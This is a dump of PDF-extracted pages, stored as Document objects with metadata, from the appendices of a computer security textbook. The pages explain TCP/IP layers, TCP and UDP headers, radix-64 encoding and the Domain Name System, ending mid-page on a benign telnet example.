priority, that might \\nbe provided by the network. The specific software used at this layer depends on \\nthe type of network to be used; different standards have been developed for circuit \\nswitching, packet switching (e.g., frame relay), LANs (e.g., Ethernet), and others. Thus, \\nit makes sense to separate those functions having to do with network access into a \\nseparate layer. By doing this, the remainder of the communications software, above \\nthe network access layer, need not be concerned about the specifics of the network \\nto be used. The same higher-layer software should function properly regardless of the \\nparticular network to which the computer is attached.\\nZ09_STAL0611_04_GE_APPF.indd   2 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 934, 'page_label': 'F-3'}, page_content='F .2 / TCP AND UDP  F-3\\nThe network access layer is concerned with access to and routing data across \\na network for two end systems attached to the same network. In those cases, where \\ntwo devices are attached to different networks, procedures are needed to allow data \\nto traverse multiple interconnected networks. This is the function of the Internet \\nlayer. The Internet Protocol (IP) is used at this layer to provide the routing function \\nacross multiple networks. This protocol is implemented not only in the end systems, \\nbut also in routers. A router is a processor that connects two networks and whose \\nprimary function is to relay data from one network to the other on a route from the \\nsource to the destination end system.\\nRegardless of the nature of the applications that are exchanging data, there \\nis usually a requirement that data be exchanged reliably. That is, we would like to \\nbe assured that all the data arrive at the destination application, and that the data \\narrive in the same order in which they were sent. As we shall see, the mechanisms \\nfor providing reliability are essentially independent of the nature of the applica-\\ntions. Thus, it makes sense to collect those mechanisms in a common layer shared by \\nall applications; this is referred to as the host-to-host layer, or transport layer. The \\n Tr\\nansmission Control Protocol (TCP) is the most commonly used protocol to provide \\nthis functionality.\\nFinally, the application layer contains the logic needed to support the  various \\nus\\ner applications. For each different type of application, such as file transfer, a \\n separate module is needed that is peculiar to that application.\\n F.2 TCP AND UDP\\nFor most applications running as part of the TCP/IP protocol architecture, the trans-\\nport layer protocol is TCP . TCP provides a reliable connection for the transfer of data \\nbetween applications. A connection is simply a temporary logical association between \\ntwo entities in different systems. For the duration of the connection, each entity keeps \\ntrack of segments coming and going to the other entity, in order to regulate the flow \\nof segments and to recover from lost or damaged segments.\\nF\\nigure F.1a shows the header format for TCP , which is a minimum of 20 octets, \\nor 160 bits. The Source Port and Destination Port fields identify the applications at the \\nsource and destination systems that are using this connection. The Sequence Number, \\nAcknowledgment Number, and Window fields provide flow control and error control. \\nThe checksum is a 16-bit code based on the contents of the segment used to detect \\nerrors in the TCP segment.\\nIn addition to TCP , there is one other transport-level protocol that is in com-\\nmon use as part of the TCP/IP protocol suite: the User Datagram Protocol (UDP). \\nUDP does not guarantee delivery, preservation of sequence, or protection against \\nduplication. UDP enables a process to send messages to other processes with a \\nminimum of protocol mechanism. Some transaction-oriented applications make \\nuse of UDP; one example is SNMP (Simple Network Management  Protocol),\\n \\nthe standard network management protocol for TCP/IP networks. Because it \\nis connectionless, UDP has very little to do. Essentially, it adds a port address-\\ning capability to IP . This is best seen by examining the UDP header, shown in  \\nFigure F.1b.\\nZ09_STAL0611_04_GE_APPF.indd   3 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 935, 'page_label': 'F-4'}, page_content='F-4  APPENDIX F / THE TCP/IP PRO TOCOL ARCHITECTURE\\n F.3 OPERATION OF TCP/IP\\nFigure F.2 indicates how these protocols are configured for communications. Some \\nsort of network access protocol, such as the Ethernet logic, is used to connect a com-\\nputer to a network. This protocol enables the host to send data across the network \\nto another host or, in the case of a host on another network, to a router. IP is imple-\\nmented in all end systems and routers. It acts as a relay to move a block of data from \\none host, through one or more routers, to another host. TCP is implemented only in \\nthe end systems; it keeps track of the blocks of data being transferred to assure that \\nall are delivered reliably to the appropriate application.\\nFor successful communication, every entity in the overall system must have a \\nunique address. In fact, two levels of addressing are needed. Each host on a network \\nmust have a unique global Internet address; this allows the data to be delivered to \\nthe proper host. This address is used by IP for routing and delivery. Each application \\nwithin a host must have an address that is unique within the host; this allows the host-\\nto-host protocol (TCP) to deliver data to the proper process. These latter addresses \\nare known as ports.\\nLet us trace a simple operation. Suppose a process, associated with port\\xa03 at \\nhost A, wishes to send a message to another process, associated with port 2 at host\\xa0B. \\nThe process at A hands the message down to TCP with instructions to send it to host \\nB, port 2. TCP hands the message down to IP with instructions to send it to host B. \\nNote that IP need not be told the identity of the destination port. All it needs to \\nknow is that the data are intended for host B. Next, IP hands the message down to \\nFigure F.1 TCP and UDP Headers\\nSource Port Destination Port\\nChecksum Urgent Pointer\\nSequence Number\\nAcknowledgment Number\\nOptions + Padding\\nReserved Flags WindowHeader\\nlength\\n0 Bit: 4 8 16 31\\n20 octets\\nSource Port Destination Port\\nSegment Length Checksum\\n0 Bit: 16 31\\n8 octets\\n(a) TCP Header\\n(b) UDP Header\\nZ09_STAL0611_04_GE_APPF.indd   4 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 936, 'page_label': 'F-5'}, page_content='F .3 / OPERATION OF TCP/IP  F-5\\nthe network access layer (e.g., Ethernet logic) with instructions to send it to router J \\n(the first hop on the way to B).\\nTo control this operation, control information as well as user data must be \\ntransmitted, as suggested in Figure F.3. Let us say that the sending process generates \\na block of data and passes this to TCP . TCP may break this block into smaller pieces \\nto make it more manageable. To each of these pieces, TCP appends control informa-\\ntion known as the TCP header (see \\nFigure F.1a), forming a TCP segment. The control \\ninformation is to be used by the peer TCP protocol entity at host B. Examples of \\nitems in this header include:\\n• Destination port: When the \\nTCP entity at B receives the segment, it must know \\nto whom the data are to be delivered.\\n• Se\\nquence number:  TC\\nP numbers the segments that it sends to a particular \\ndestination port sequentially so if they arrive out of order, the TCP entity at B \\ncan reorder them.\\n• Checksum: The sending \\nTCP includes a code that is a function of the contents \\nof the remainder of the segment. The receiving TCP performs the same calcula-\\ntion and compares the result with the incoming code. A discrepancy results if \\nthere has been some error in transmission.\\nFigure F.2 TCP/IP Concepts\\nRouter J\\nTCP\\nIP\\nPhysical Physical\\nIP\\nNAP 1 NAP 2\\nPhysical Physical\\nNetwork Access\\nProtocol #1\\nHost A\\nApp X\\nApp Y\\nTCP\\nIP\\nNetwork Access\\nProtocol #2\\nHost B\\nApp Y\\nApp X\\nNetwork 1 Network 2\\nGlobal Internet\\naddress\\n1 2 2 4 63\\nSubnetwork attachment\\npoint address\\nLogical connection\\n(e.g., virtual circuit)\\nLogical connection\\n(TCP connection)\\nPort \\nZ09_STAL0611_04_GE_APPF.indd   5 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 937, 'page_label': 'F-6'}, page_content='F-6  APPENDIX F / THE TCP/IP PR OTOCOL ARCHITECTURE\\nNext, TCP hands each segment over to IP , with instructions to transmit it to \\nB. These segments must be transmitted across one or more networks and relayed \\nthrough one or more intermediate routers. This operation, too, requires the use \\nof control information. Thus, IP appends a header of control information (see  \\nFigure F.3) to each segment to form an IP datagram. An example of an item stored \\nin the IP header is the destination host address (in this example, B).\\nFinally, each IP datagram is presented to the network access layer for transmis-\\nsion across the first network in its journey to the destination. The network access \\nlayer appends its own header, creating a packet, or frame. The packet is transmitted \\nacross the network to router J. The packet header contains the information that the \\nnetwork needs in order to transfer the data across the network. Examples of items \\nthat may be contained in this header include:\\n•\\n Destination netw\\nork address:  T\\nhe network must know to which attached \\ndevice the packet is to be delivered, in this case router J.\\n•\\n F\\nacilities requests: T\\nhe network access protocol might request the use of cer -\\ntain network facilities, such as priority.\\nAt router J, the packet header is stripped off and the IP header examined. On \\nthe basis of the destination address information in the IP header, the IP module in \\nthe router directs the datagram out across network 2 to B. To do this, the datagram is \\nagain augmented with a network access header.\\nWhen the data are received at B, the reverse process occurs. At each layer, the \\ncorresponding header is removed, and the remainder is passed on to the next higher \\nlayer, until the original user data are delivered to the destination process.\\nFigure F.3 Pr otocol Data Units (PDUs) in the TCP/IP \\nArchitecture\\nUser data\\nTCP\\nheader\\nIP\\nheader\\nNetwork\\nheader\\nApplication byte stream\\nTCP segment\\nIP datagram\\nNetwork-level packet\\nZ09_STAL0611_04_GE_APPF.indd   6 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 938, 'page_label': 'F-7'}, page_content='F .4 / TCP/IP APPLICATIONS  F-7\\n F.4  TCP/IP APPLIC ATIONS\\nA number of applications have been standardized to operate on top of TCP . We \\n mention thr\\nee of the most common here.\\nThe Simple Mail Transfer Protocol (SMTP) provides a basic electronic mail \\nfacility. It provides a mechanism for transferring messages among separate hosts. \\nFeatures of SMTP include mailing lists, return receipts, and forwarding. The SMTP \\nprotocol does not specify the way in which messages are to be created; some local \\nediting or native electronic mail facility is required. Once a message is created, SMTP \\naccepts the message and makes use of TCP to send it to an SMTP module on another \\nhost. The target SMTP module will make use of a local electronic mail package to \\nstore the incoming message in a user’s mailbox.\\nThe File Transfer Protocol (FTP) is used to send files from one system to \\nanother under user command. Both text and binary files are accommodated, and \\nthe protocol provides features for controlling user access. When a user wishes to \\nengage in file transfer, FTP sets up a TCP connection to the target system for the \\nexchange of control messages. This connection allows user ID and password to be \\ntransmitted and allows the user to specify the file and file actions desired. Once a \\nfile transfer is approved, a second TCP connection is set up for the data transfer. The \\nfile is transferred over the data connection, without the overhead of any headers \\nor control information at the application level. When the transfer is complete, the \\ncontrol connection is used to signal the completion and to accept new file transfer \\ncommands.\\nSSH (Secure Shell) provides a secure remote logon capability, which enables a \\nuser at a terminal or personal computer to logon to a remote computer and function \\nas if directly connected to that computer. SSH also supports file transfer between \\nthe local host and a remote server. SSH enables the user and the remote server to \\nauthenticate each other; it also encrypts all traffic in both directions. SSH traffic is \\ncarried on a TCP connection.\\nZ09_STAL0611_04_GE_APPF.indd   7 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 939, 'page_label': 'G-1'}, page_content='G-1\\nAPPENDIX G\\nRADIX-64 CoNvERsIoN\\nS/MIME make uses of an encoding technique referred to as radix-64 conversion. This \\ntechnique maps arbitrary binary input into printable character output. The form of \\nencoding has the following relevant characteristics:\\n1. The r\\nange of the function is a character set that is universally representable at \\nall sites, not a specific binary encoding of that character set. Thus, the characters \\nthemselves can be encoded into whatever form is needed by a specific system. \\nFor example, the character “E” is represented in an ASCII-based system as \\nhexadecimal 45, and in an EBCDIC-based system as hexadecimal C5.\\n2. The char\\nacter set consists of 65 printable characters, one of which is used for \\n padding.\\n With 26 = 64 available characters, each character can be used to repre-\\nsent 6 bits of input.\\n3. No control char\\nacters are included in the set. Thus, a message encoded in radix 64 \\ncan traverse mail-handling systems that scan the data stream for control characters.\\n4. The hyphen char\\nacter (“-”) is not used. This character has significance in the \\nRFC 822 format and should therefore be avoided.\\nTable G.1 shows the mapping of 6-bit input values to characters. The character \\nset consists of the alphanumeric characters plus ;+< and “/”. The ;=< character is \\nused as the padding character.\\nF\\nigure G.1 illustrates the simple mapping scheme. Binary input is processed in \\nblocks of 3 octets, or 24 bits. Each set of 6 bits in the 24-bit block is mapped into a \\ncharacter. In the figure, the characters are shown encoded as 8-bit quantities. In this \\ntypical case, each 24-bit input is expanded to 32 bits of output.\\nFor example, consider the 24-bit raw text sequence 00100011 01011100 \\n10010001, which can be expressed in hexadecimal as 235C91. We arrange this input \\nin blocks of 6 bits:\\n001000 110101 110010 010001\\nThe extracted 6-bit decimal values are 8, 53, 50, and 17 . Looking these up in Table G.1 \\nyields the radix-64 encoding as the following characters: I1yR. If these characters are \\nstored in 8-bit ASCII format with parity bit set to zero, we have\\n01001001 00110001 01111001 01010010\\nZ10_STAL0611_04_GE_APPG.indd   1 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 940, 'page_label': 'G-2'}, page_content='G-2  APPENDIX G / RADIX-64 CONVERSION\\n6-Bit \\nValue\\nCharacter \\nEncoding\\n6-Bit \\nValue\\nCharacter \\nEncoding\\n6-Bit \\nValue\\nCharacter \\nEncoding\\n6-Bit \\nValue\\nCharacter \\nEncoding\\n0 A 16 Q 32 g 48 w\\n1 B 17 R 33 h 49 x\\n2 C 18 S 34 i 50 y\\n3 D 19 T 35 j 51 z\\n4 E 20 U 36 k 52 0\\n5 F 21 V 37 l 53 1\\n6 G 22 W 38 m 54 2\\n7 H 23 X 39 n 55 3\\n8 I 24 Y 40 o 56 4\\n9 J 25 Z 41 p 57 5\\n10 K 26 a 42 q 58 6\\n11 L 27 b 43 r 59 7\\n12 M 28 c 44 s 60 8\\n13 N 29 d 45 t 61 9\\n14 O 30 e 46 u 62 +\\n15 P 31 f 47 v 63 /\\n(pad) =\\nTable  G.1   Radix-64 Encoding\\nFigure\\n G.1\\n Printa\\nble Encoding of Binary Data into Radix-64 Format\\n24 bits\\nR64 R64 R64 R64\\n4 characters = 32 bits\\nZ10_STAL0611_04_GE_APPG.indd   2 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 941, 'page_label': 'G-3'}, page_content='RADIX-64 CONVERSION  G-3\\nIn hexadecimal, this is 49317952. The following table provides a summary.\\nInput Data\\nBinary representation 00100011 01011100 10010001\\nHexadecimal representation 235C91\\nRadix-64 Encoding of Input Data\\nCharacter representation I1yR\\nASCII code (8 bit, zero parity) 01001001 00110001 01111001 01010010\\nHexadecimal representation 49317952\\nZ10_STAL0611_04_GE_APPG.indd   3 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 942, 'page_label': 'H-1'}, page_content='H-1\\nAPPENDIX H\\nTHE DomAIN NAmE SySTEm\\nH.1 Domain Names\\nH.\\n2\\n The DNS Database\\nH.\\n3\\n DNS Operation\\nT\\nhe Server Hierarchy\\nName Resolution\\nDNS Messages\\nZ11_STAL0611_04_GE_APPH.indd   1 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 943, 'page_label': 'H-2'}, page_content='H-2  APPENDIX H / THE DOMAIN NAME SY STEM\\nThe Domain Name System (DNS) is a directory lookup service that provides a  mapping \\nbetween the name of a host on the Internet and its numerical addr\\ness. DNS is essential to \\nthe functioning of the Internet. It is defined in RFC 1034 (Domain names - concepts and \\nfacilities, 1987) and RFC 1035 (Domain names—implementation and specification, 1987).\\nFour elements comprise the DNS:\\n1. Domain name space:  DNS uses a tree-structur\\ned name space to identify \\nresources on the Internet.\\n2. DNS database:  Conceptually,\\n each node and leaf in the name space tree \\n structure names a set of information (e\\n.g., IP address, type of resource) that is \\ncontained in a resource record (RR). The collection of all RRs is organized into \\na distributed database.\\n3. Name servers: These ar\\ne server programs that hold information about a por -\\ntion of the domain name tree structure and the associated RRs.\\n4. Resolv\\ners: These ar\\ne programs that extract information from name servers in \\nresponse to client requests. A typical client request is for an IP address corre-\\nsponding to a given domain name.\\nIn the next two sections, we examine domain names and the DNS database, \\nrespectively. We will then describe the operation of DNS, which includes a discus-\\nsion of name servers and resolvers.\\n H.1 DOMAIN NAMES\\nThe IP address provides a way of uniquely identifying devices attached to the Inter-\\nnet. This address is interpreted as having two components: a network number that, \\nidentifies a network on the Internet, and a host address that, identifies a unique host \\non that network. The practical use of IP addresses presents two problems:\\n1. Routers devise a path thr\\nough the Internet on the basis of the network number. \\nIf each router needed to keep a master table that listed every network and the \\npreferred path to that network, the management of the tables would be cumber-\\nsome and time consuming. It would be better to group the networks in such a \\nway as to simplify the routing function.\\n2. The 32-bit IPv4 address is usually written as four decimal numbers, correspond-\\ning to the four octets of the address. This number scheme is effective for com-\\nputer processing but is not convenient for users, who can more easily remember \\nnames than numerical addresses.\\nThese problems are addressed by the concept of domain. In general terms, \\na domain refers to a group of hosts that are under the administrative control of \\na single entity, such as a company or government agency. Domains are organized \\nhierarchically, so a given domain may consist of a number of subordinate domains. \\nNames are assigned to domains and reflect this hierarchical organization.\\nF\\nigure H.1 shows a portion of the domain-naming tree. At the very top level \\nare a small number of domains that encompass the entire Internet. Additionally, \\nat the top level are various country codes, such as us (United States), cn (People’s \\nRepublic of China), and br (Brazil). Table H.1 lists some noncountry top-level \\nZ11_STAL0611_04_GE_APPH.indd   2 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 944, 'page_label': 'H-3'}, page_content='H.1 / DOMAIN NAMES  H-3\\nFigure H.1 P ortion of Internet Domain Tree\\ncom\\nibm apple\\ninfo\\nmil\\nmit\\nedu\\ntreas\\ngov net\\nshore ieee acm\\norg us cn br\\nraleigh\\nitso\\n(root)\\ncsail lcs\\nDomain Contents\\ncom Commercial organizations\\nedu Educational institutions\\ngov U.S. federal, state, and local government agencies\\nmil U.S. military\\nnet Network support centers, Internet service providers, and other network-related \\norganizations\\norg Nonprofit organizations\\nus U.S. state and local government agencies, schools, libraries, and museums\\ncountry code ISO standard 2-letter identifier for country-specific domains (e.g., au, ca, and uk)\\nbiz Dedicated exclusively for private businesses\\ninfo Unrestricted use\\nname Individuals, for e-mail addresses and personalized domain names\\nmuseum restricted to museums, museum organizations, and individual members of the \\nmuseum profession\\ncoop Member-owned cooperative organizations, such as credit unions\\naero Aviation community\\npro Medical, legal, and accounting professions\\narpa Address and routing parameter area; used for technical infrastructure purposes, \\nsuch as reverse domain name resolution\\nint International organizations\\nTable H.1   Top-Level Internet Domains\\nZ11_STAL0611_04_GE_APPH.indd   3 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 945, 'page_label': 'H-4'}, page_content='H-4  APPENDIX H / THE DOMAIN N AME SYSTEM\\ndomains. Each subordinate level is named by prefixing a subordinate name to the \\nname at the next highest level. For example,\\n•\\n edu is the domain of college-level U\\n.S. educational institutions.\\n•\\n mit.edu is the domain for MIT (Massachuset\\nts Institute of Technology).\\n•\\n csail.mit.edu \\nis the domain for the MIT Computer Science and Artificial Intel-\\nligence Laboratory.\\nAs you move down the naming tree, you eventually get to leaf nodes that \\nidentify specific hosts on the Internet. These hosts are assigned Internet addresses. \\nDomain names are assigned hierarchically in such a way that every domain name \\nis unique. At a top level, the creation of new top-level names and the assignment \\nof names and addresses are administered by the Internet Corporation for Assigned \\nNames and Numbers (ICANN). The actual assignment of addresses is delegated \\ndown the hierarchy. Thus, the mil domain is assigned a large group of addresses. \\nThe U.S. Department of Defense (DoD) then allocates portions of this address \\nspace to various DoD organizations for eventual assignment to hosts.\\nFor example, the main host at MIT, with a domain name of mit.edu, has the \\nIP address 104.74.27 .200. The subordinate domain csail.mit.edu has the IP address \\n128.30.2.121.1\\n H. 2  THE DNS D ATABASE\\nDNS is based on a hierarchical database containing resource records (RRs) that \\ninclude the name, IP address, and other information about hosts. The key features \\nof the database are as follows:\\n•\\n V\\nariable-depth hierarchy for names:  DNS \\nallows essentially unlimited levels \\nand uses the period (.) as the level delimiter in printed names, as described \\nearlier.\\n•\\n Distributed \\ndatabase: T\\nhe database resides in DNS servers scattered through-\\nout the Internet and private intranets.\\n•\\n Distribution contr\\nolled by the database:  T\\nhe DNS database is divided into \\nthousands of separately managed zones, which are managed by separate admin-\\nistrators. The database software controls distribution and update of records.\\nUsing this database, DNS servers provide a name-to-address directory ser -\\nvice for network applications that need to locate specific servers. For example, \\nevery time an e-mail message is sent or a webpage is accessed, there must be a \\nDNS name lookup to determine the IP address of the e-mail server or Web server.\\n1As of mid-2017 . There may also be IPv6 addresses associated with these names. You should be able to \\ndemonstrate the name/address function by connecting your Web browser to your local ISP’s Web server. \\nThe ISP should provide a ping or nslookup tool that allows you to enter a domain name and retrieve an \\nIP address. Such a tool is typically available on user operating systems as well using commands such as \\nhost or nslookup..\\nZ11_STAL0611_04_GE_APPH.indd   4 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 946, 'page_label': 'H-5'}, page_content='H.2 / THE DNS DATABASE  H-5\\nFigure H.2 shows the structure of a RR. It consists of the following elements:\\n• Domain Name: Although the syntax of \\ndomain names in messages, described \\nsubsequently, is precisely defined, the form of the domain name in a RR is \\ndescribed in general terms. In essence, the domain name in a RR must corre-\\nspond to the human-readable form, which consists of a series of labels of alpha-\\nnumeric characters or hyphens, with each pair of labels separated by a period.\\n• Type: Identifies the type of resour\\nce in this RR. The various types are listed \\nin Table H.2.\\n• Class: Identifies the protocol family. The only commonly used value is IN, for \\nthe Internet.\\nFigure H.2 DNS Resource R ecord Format\\nbit 0 16 31\\nType\\nRdata Field Length\\nTime to Live\\nRdata\\n(variable length)\\nClass\\nDomain Name\\n(variable length)\\nType Description\\nA A host address. This RR type maps the name of a system to its IPv4 address. Some \\nsystems (e.g., routers) have multiple addresses, and there is a separate RR for each.\\nAAAA Similar to A type, but for IPv6 addresses.\\nCNAME Canonical name. Specifies an alias name for a host and maps this to the canonical \\n(true) name.\\nHINFO Host information. Designates the processor and operating system used by the host.\\nMINFO Mailbox or mail list information. Maps a mailbox or mail list name to a host name.\\nMX Mail exchange. Identifies the system(s) via which mail to the queried domain name \\nshould be relayed.\\nNS Authoritative name server for this domain.\\nPTR Domain name pointer. Points to another part of the domain name space.\\nSOA Start of a zone of authority (which part of naming hierarchy is implemented). \\nIncludes parameters related to this zone.\\nSRV For a given service provides name of server or servers in domain that provide that \\nservice.\\nTXT Arbitrary text. Provides a way to add text comments to the database.\\nWKS Well-known services. May list the application services available at this host.\\nNote: The SRV RR type is defined in RFC 2782\\nTable H.2   Resource R ecord Types\\nZ11_STAL0611_04_GE_APPH.indd   5 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 947, 'page_label': 'H-6'}, page_content='H-6  APPENDIX H / THE DOMAIN NAME SY STEM\\n• Time to Live:  Typically , when a RR is retrieved from a name server, the \\nretriever will cache the RR so it need not query the name server repeatedly. \\nThis field specifies the time interval that the RR may be cached before the \\nsource of the information should again be consulted. A zero value is interpreted \\nto mean that the RR can only be used for the transaction in progress and should \\nnot be cached.\\n• Rdata Field Length: Length of the Rdata field in octets.\\n• Rdata: A variable length string of octets that describes the r\\nesource. The format \\nof this information varies according to the type of the RR. For example, for the \\nA type, the Rdata is a 32-bit IPv4 address, and for the CNAME type, the Rdata \\nis a domain name.\\n H.3 DNS OPERATION\\nDNS operation typically includes the following steps (see Figure H.3):\\n1. A user progr\\nam requests an IP address for a domain name.\\n2. A resolver module in the local host or local ISP queries a local name server in the\\n \\nsame domain as the resolver.\\n3. The local name server checks to see if the name is in its local database or cache\\n, \\nand, if so, returns the IP address to the requestor. Otherwise, the name server que-\\nries other available name servers, if necessary going to the root server, as explained \\nsubsequently.\\nFigure H.3 DNS Name Resolution\\nUser\\nProgram\\nUser\\nSystem\\nInternet\\nuser\\nquery query\\nquery\\nuser\\nresponse\\nresponse\\nresponse\\nName\\nResolver\\nCache\\nName\\nServer\\nCache\\nDatabase\\nDatabase\\nForeign\\nName\\nServer\\nCache\\nZ11_STAL0611_04_GE_APPH.indd   6 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 948, 'page_label': 'H-7'}, page_content='H.3 / DNS OPERATION  H-7\\n4. W hen a response is received at the local name server, it stores the name/address \\nmapping in its local cache and may maintain this entry for the amount of time \\nspecified in the time to live field of the retrieved RR.\\n5.\\n T\\nhe user program is given the IP address or an error message.\\nThe results of these behind-the-scenes activities are seen by the user in a way \\nillustrated in Figure H.4. Here, a user issues a Telnet connection request to locis.\\nloc.gov. This is resolved by DNS to the IP address of 140.147 .254.3.\\ntelnet locis.loc.gov\\nTrying 140.147.254.3...\\nConnected to locis.loc.gov.\\nEscape character is ‘^]’.\\nL O C I S: LIBRARY OF CONGRESS INFORMATION SYSTEM\\nTo make a choice: type a number, then press ENTER\\n1 Copyright Information -- files available and up-to-date\\n2 Braille and Audio -- files frozen mid-August 1999\\n3 Federal Legislation -- files frozen December 1998\\n* * * * * * * * * * * * * * *\\nThe LC Catalog Files are available at:\\nhttp://lcweb.loc.gov/catalog/\\n* * * * * * * * * * * * * * *\\n8 Searching Hours and Basic 